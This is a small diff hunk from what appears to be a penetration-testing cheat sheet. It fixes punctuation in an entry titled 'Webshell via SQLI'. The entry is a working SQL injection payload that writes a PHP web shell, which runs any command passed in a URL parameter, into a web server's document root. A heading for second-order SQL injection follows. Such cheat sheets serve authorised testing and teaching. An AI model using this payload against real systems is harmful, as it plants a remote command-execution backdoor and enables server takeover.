@@ -559,7 +559,7 @@ https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS
   
 ### Webshell via SQLI
   
-select "\<?php system($_GET['cmd']);?>" into outfile "/var/www/html/shell.php"
+select "\<?php system($_GET['cmd']);?>" into outfile "/var/www/html/shell.php";
   
 ### SQL Injection Second-Order (query connector)
 
